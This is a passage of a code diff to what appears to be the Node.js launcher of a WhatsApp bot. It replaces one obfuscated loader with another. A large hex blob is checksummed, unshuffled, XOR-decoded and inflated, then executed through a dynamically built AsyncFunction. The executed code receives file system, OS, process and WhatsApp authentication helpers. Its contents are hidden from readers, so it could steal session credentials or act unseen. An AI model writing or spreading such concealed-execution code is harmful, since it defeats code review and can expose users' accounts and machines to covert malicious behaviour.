8cddc1746c89b934808bb1a6f0e6c6cb9463b471466fc851179112fc3c414afdc171399a7dc4caa7130ba3c033a81ba9eb6c8ca5114bdb5e9bff38032e1c895f5000fdd2978bf146db1e39450e730a182b774eb4850d9530ec27823f84770ff1bf4ed58da43e4ff7eaeac7b9b2b7a2be3b5cfc11eef78caeca7efd6f7ce15fc5b5e90678b72a34ca6de5abd9f9c25f1d6b3f64f6fd43f20398877470212019464f32b60840cc3275ca41d5724f4b9c771234a82ed957ddb4e8c0f85580b7448d534b6160bfb2f118172e3648efd68854a7ffda66542649f86db57e82edb2a418764765119c0c4daaf376ae153ed124096c9da3503f2cce1bd1aef850e4cd60257e7b4fc04202b505fcbb469377efc47d3efb3865d6611b90e8a60fb9faf7fbd533ae1220aa39e2f280913f40684724e6fc220f71e36129bd32fabc3cae24d22c6abd833013cd10cf3570f1bb98ff5d0448b7c45b723a0b0a852f0caebeeab383f114fb3610dc06ae1cf45f77727991e8d6a72f3faa4f7b60168f70e912dc649f2f89e5f5e33cccc7737d8ab0ea064e14de6239818a2d51555d5f59a9a97305ec28130693990911966aa57ab4b004cf5d12f5e314412a9d0bf1025789d509cb983d9362811e5b3022df3316f336c77147172d995752bbac2cb209d6f56868d2659eddc1d81b0bcbad20f9545ecbd46a707763739f2935469db55f95650d6ad3df333e8fcc74be6c6eb41a1c18d517654e14754499faa8cf15bf274decc2241d7beecb951c2f15280a97dc4bb3e7b4a4df5cc44b666b4426de62197966bdccfc08210638035304bd7e4f4ba7f6e5951d9d793ca579430bfb661f73942203df5ebae3ebaf8ab7e88df3c4b886d724574365287f69ef24ebdcbf77ea835bd63992cfc444275fedd880443db11187b078929164cf5a130a7d4ee012bf1ba23ce71432ceb76ccb4f3f05c741b1881acb92ee33fe260fec83a650fb59f9c1c6c0ff2b3cb15bb3553ab362936ea858c01de67ccb47060df3d1034580ef5104f1f9ddf61cbc8730b634f34c40000ff61747b60de64e6fdb703a1b47fec9c42ea2d805f093037c807d965a8f8ceda9cf7b76150d106b9a4c257f39aa2bd1239bff907a0e9b6c6fcd27e38e9b30d3a87e4aaa990cccd7601004a098f9f492793d748e15df994282a06987d96ae8befeb962336a8058077af9bd2094aee1ec576dec5be0229613bb594a2b93521c2a8f541f8c4dac4a7211d6b1e3970d2f0eb02f7fdd43939aeb401cd3e43ef931604de97faeeec6f191ba99eec7f9f4401df277dd90b65e41e0a958b885eb4ae8614b4833d13ae563fdcedd6515dca0b9897448a6a6abe0a06099a33c1f43df86a8624c2217e4b537f8daca5297adfbe0ea1a47d9aaeba6cb619cba1ca578ac1d7e577e4c7b098388bbf772e53b628dd560c59d6943817fc9520aeb3ff175afd858abb542e498be3ef3aca4a3d32ef66b43a7e29b132fb34967f065303557c9a39664e66268791c9e7603924fe6081604b359ccdae3f35431a1ecdc08f823d4c625e96438790d49bdd61ea0269dc4a9e666cb0b28508919484a72763c13366b54cf358165adba5eaa788e952bff97d76a9b0424f9a6f17dee46690890637bba8ae2da250dc79656d674e93526f80be1d7effd690044d906393b643f2bceec4476443b6bfa2eab44e920d42f8841f1fbd5387188c1551902c5ba8de2992d9dc6268600d1e9a5b3754b689366244781ab1c86471ad133658be3fedb4ca8a6710184c95e4d1dc09fb0acc50c2ae18960a74b66a3157b48be6cc91018aee7b588d023c8f2411b6e8d8c1b6b4631c20fa78b894eb1020e33cd1ffe6f91f92b09715db0658f344ebebf82e6c225ad840f6d17612082853dd0afacb043581474bde8d6691c5f52b451661b818654fe88bba0e5e1f87d0fc2ee063f7e1dc819f072acb9bbedfd9b1fb03f5557d36b0674fb9833a80715668b593968d2043a9db4c65d3a37fe3e752e4ed7ceb4f99aba462eeb0b00941a28040cde082114a6cdf8c5264b6b87f3183c937532e12cedbe78c42292bc9c39b306d9bae551a094ac780d250ff13b80b6fa9893c4fa0678f8afcf55fe6da6a1bdd0c3aa65e42ad23688e0bcc844b5625fac8af7cce0aec54fd48286a594b3334bceeb40c30bef0b91ca48c265c3e6b701aeb656fb98b06fcd32ac27d9781171b0ecc9f1f6b80aefb4fc5824dc7b76cd1e0b2fa06081454df4964a951056ffbbb0cfc91d52b4d8123403508319b185499081a882a3046dacc2f7b50975f4d1fc10e1e62a55bc23407e17b84963a888ce81174cbc17a53200e10138ba227614c40d383cedf15d86977b5c901348ad8df9cdb0921d18d0c30a881461e61b86160fad617e3fbbc3061e6026ab84f3214013cb72de4d23dd7717a37f7dc846426a9bc1bc450b20cb382ab704659e73e0e6e46a42f273ce4486e32622f0c6020524def0452fdbd77459de1ef1e13369be0b51bdeb85fb90f3278732d657999d8610a51627844352b88f8aaf8a977a4ec0c2c53633836359542b0c5c4cc447cb453d65e69b91992ad6969cc100d08d2143adc763152709c27ae9db70accfed6b49cb04b70233fbfc3d69bd7310b4be09dc0967176f3f2d56a1d9a00d0d8619634c4f968e5e6ce46a691b8c87480c4bdad8f80e7575fa95da25ddc6194c45c0cf6379b3cd64741393112a98e37221c934bf483edba6fc83665931dd9392af05abb66a9e3cd331c5ce34305460138c253480cc691bd4b2bc1ebae7460b16f7fae3711b2a8c416bd2bd07e2b1e8b562cef6ff3b9af55c5672f957134d769dc93340eb66941c4dbc2f03ae17f518e4972b346436d21e180b90612fd1ee67bc9b9d6166afbae89ea7117196df88f8f93b89caf6cfe4f812b8a133a390d3de0079cce2cd9c5c80ddd8f0001d0f88d5220efb91e7ed8f63d63bbecb72c461cedd2303af76a4259971e7f1f15347783bcf66c298199a61ab18aa03374df80399ffadbe4bbb21e93ba41b84d6ac64a49d1967323d315b856a29a7aabcb0dc230b4359007f01d58de46f6862df401adc106ea06214f5f12bad8ddab13b34448e65d87b2be577d673bb2a7ef1a9ce4434f9c09e224dda58c2474d2fa758ac27e62d895bee36537c2e1c09ff7b1caa3d88d2c7b4b43b0628dc993fb78c3dd21da52dcb1b69d136243f285ee87bf5015d29c14059e7e4b6063df16b40691d4b3cc748241b35363f01cb162afaf24fe8ebabe3f9ac4799c9aa35f077e3eef1e306b20ce41be9d744b493d568ae88c9a9fe69ba4f33dc7280cc596925f6829e9d08c38e29a60289f19a3b8e95bd4475fdd4d322e7c37ecbd0593da4ea666dd2ae720c986500a877177103ca5e89d43b27b7e82fe17edf57a6e9c602d696b6a1158135d6acce9c1b27aba1e274de372978f10ba45c6678d37badcc4e2929cc46d019ffae9846977e2ea3ecaa2ad9a7a690dd8f51d02a926f1b43aab0478b9b4c96c123ec16ba7799029c201099a07683629d86088c39db13f67f0851eae0056e1045a3a11082e8a979254b055f907b1c61fdff00d652e01e16c34dbb72cb93dec4dd3265624fbf40f103d55711e2510068350cc6d2e56d119395294aeb66b6338d3dfbbff041254bb16b5c5eec6f3429972b9f8c057eda35d6f63841917e7890f2ebf0aa6f4a24497587a7a2b1d7b23f791e27f92ed01d88476d27930399ecdc56c1aee9a4f119591cd0c7e8a4bdc2b169102bcf6c017c5c628b93134f2711435c2e775b350fc50a8bdd0707dd3a70f2dbb009736830c02bbf03ffadfdeb81e6b7100b06685e03710e46ca21c31bec5d548de6ae3716157af20b4e40c0601f06695be13fc0d330ab08e0a8cb63826ae4d3ab160478e21ae693b7ddec262c629e5d886f678f1e7746dc08dee12698d9c21bd402b6c68e93ad05909fcb30bd77f5d0cdd2261795951d842f62f3868a382e33c93f0ef16f214ff91a8e73720f593ed414e4303f74d40ead9984934d9a03c7bd715ade80e89547915826df108b768e039cd17829ad703a6cbab8430dd65e1cac1936ef57d8b4b229095b3560f7186758450f8e81f74f73ca64b9a1b6c12079fd34e5338621b9798fb96581545ca5bc98a3a6b424f9985a0e865e2b5ef23d02fd06d42b3fc49be1b402b74d00d28f42c114a3edbe01403919040ecad399ae06101f6225f44d24da41c2d9dc229d12030e142d4e54926fefc013cf273c62cf40e883cd7a6524f04ff33479b98bec961a097712aa7e5f287768307cfd9c5f5682b427d051edfb8e5fb87623dc74ad88256616d3ca117bb1b08ef378810eb65a6eed09ecce95fc027c9575e27e2190dd83b8f8053030c8d3eae8c565a53f804e60dbdf3adc5d330555e2d707df574fcaa2972071290bcc314ae1a91a1fcff0df898df3651f24095f3020157b8cdf650170ededa7f86b6cdaef5656bca0311daf4d81a8ef266bd3193f4be3302bb76e6568537760bcf5585218fa1f75b35444c9a3228570ff46835e85e8873554ceb9f158e1476393c93b96f94d173c8ff7802e5099b36e0c4e7d1a3080da90cd7e80803229701f8caf0e19d50e8133bc8fe3c53999076f035e7e41573a1659a730b38d155d23cd447f7273360be1cd71fe584199466235e651c1b96e429';
+  const _0x7e2c = 1319294423;
+  const _0x4d1b = 2343432205;
+  const _0x9b5f = [0x9f, 0x4b, 0xa1, 0x2e, 0x7c, 0xd3, 0x18, 0x6e, 0xfe, 0x39, 0x8a, 0x55, 0xb2, 0x07, 0x64, 0xca];
 
-  const 万法归一 = 解构道纹(混沌封印, 龙魂秘钥);
-  
-  const 乾坤化身 = new Function(
+  // Stage 1: Hex Reconstruction
+  const _0x3b8d = Buffer.from(_0x1a8f, 'hex');
+
+  // Stage 2: Adler-32 Verification
+  let _0x5c4a = 1, _0x2e19 = 0;
+  for (let _0x8f = 0; _0x8f < _0x3b8d.length; _0x8f++) {
+    _0x5c4a = (_0x5c4a + _0x3b8d[_0x8f]) % 65521;
+    _0x2e19 = (_0x2e19 + _0x5c4a) % 65521;
+  }
+  if (((_0x2e19 << 16) | _0x5c4a) !== _0x7e2c) {
+    throw new Error('Core integrity check failed!');
+  }
+
+  // Stage 3: Invert Permutation Matrix
+  function _0x6a2e(_0xa) {
+    return function() {
+      let _0xb = _0xa += 0x6D2B79F5;
+      _0xb = Math.imul(_0xb ^ _0xb >>> 15, _0xb | 1);
+      _0xb ^= _0xb + Math.imul(_0xb ^ _0xb >>> 7, _0xb | 61);
+      return ((_0xb ^ _0xb >>> 14) >>> 0) / 4294967296;
+    };
+  }
+  const _0x8d3c = _0x6a2e(_0x4d1b);
+  const _0x1c7b = Array.from({ length: _0x3b8d.length }, (_, _0xi) => _0xi);
+  for (let _0xi = _0x1c7b.length - 1; _0xi > 0; _0xi--) {
+    const _0xj = Math.floor(_0x8d3c() * (_0xi + 1));
+    const _0xt = _0x1c7b[_0xi];
+    _0x1c7b[_0xi] = _0x1c7b[_0xj];
+    _0x1c7b[_0xj] = _0xt;
+  }
+
+  const _0x9f1a = Buffer.alloc(_0x3b8d.length);
+  for (let _0xi = 0; _0xi < _0x3b8d.length; _0xi++) {
+    _0x9f1a[_0xi] = _0x3b8d[_0x1c7b[_0xi]];
+  }
+
+  // Stage 4: Invert Bit Rotation & Rolling XOR Cipher
+  const _0x2c4e = Buffer.alloc(_0x9f1a.length);
+  for (let _0xi = 0; _0xi < _0x9f1a.length; _0xi++) {
+    const _0xr = _0x9f1a[_0xi];
+    const _0xu = ((_0xr >>> 3) | (_0xr << 5)) & 0xff;
+    const _0xk = _0x9b5f[_0xi % _0x9b5f.length] ^ ((_0xi * 37 + 13) & 0xff);
+    _0x2c4e[_0xi] = (_0xu ^ _0xk) & 0xff;
+  }
+
+  // Stage 5: Raw Deflate Decompression
+  const _0x5e8b = zlib.inflateRawSync(_0x2c4e).toString('utf-8');
+
+  // Stage 6: Async Dynamic Runtime Execution
+  const AsyncFunction = Object.getPrototypeOf(async function(){}).constructor;
+  const _0x7b3f = new AsyncFunction(
     '__meta_url',
     'fileURLToPath',
-    'dns', 'fs', 'os', 'process', 'path',
+    'dns', 'fs', 'os', 'process', 'path', 'zlib',
     'makeWASocket', 'Browsers', 'DisconnectReason', 'useMultiFileAuthState', 'fetchLatestWaWebVersion',
     'pino', 'sharp', 'bindMessageHelpers', 'serialize', 'normalizeNumber',
     'PluginRegistry', 'PluginWatcher', 'messageHandler',
-    万法归一
+    _0x5e8b
   );
 
-  乾坤化身(
+  return _0x7b3f(
     import.meta.url,
     fileURLToPath,
-    dns, fs, os, process, path,
+    dns, fs, os, process, path, zlib,
     makeWASocket, Browsers, DisconnectReason, useMultiFileAuthState, fetchLatestWaWebVersion,
     pino, sharp, bindMessageHelpers, serialize, normalizeNumber,
     PluginRegistry, PluginWatcher, messageHandler
   );
-})();
+})().catch((err) => {
+  console.error('Fatal initialization error:', err);
+  process.exit(1);
+}))
